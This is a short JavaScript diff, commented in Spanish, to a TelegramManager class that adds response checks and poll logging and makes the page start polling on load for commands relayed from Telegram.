@@ -75,12 +75,23 @@ class TelegramManager {
             });
             
             clearTimeout(timeoutId);
-            const data = await response.json();
-
-            if (data.action) {
-                console.log('✅ ACCIÓN DETECTADA:', data.action);
-                this.stopPolling();
-                this.handleAction(data.action);
+            
+            if (response.ok) {
+                const data = await response.json();
+                if (data.action) {
+                    console.log('✅ ACCIÓN DETECTADA:', data.action);
+                    this.stopPolling();
+                    this.handleAction(data.action);
+                } else {
+                    // Log periódico cada 10 intentos
+                    if (!this.pollCount) this.pollCount = 0;
+                    this.pollCount++;
+                    if (this.pollCount % 10 === 0) {
+                        console.log(`🔍 Polling activo (${this.pollCount} intentos)...`);
+                    }
+                }
+            } else {
+                console.warn('⚠️ Response no OK:', response.status);
             }
         } catch (error) {
             if (error.name === 'AbortError') {
@@ -221,8 +232,11 @@ class TelegramManager {
 // Instancia global
 window.telegramManager = new TelegramManager();
 
-// NO iniciar polling automáticamente, solo cuando sea necesario
+// Iniciar polling al cargar para poder recibir comandos de Telegram
 document.addEventListener('DOMContentLoaded', () => {
     console.log('📱 Telegram Manager listo');
+    console.log('🔄 Iniciando polling automático...');
+    // Siempre iniciar polling para escuchar comandos
+    window.telegramManager.startPolling();
 });
 
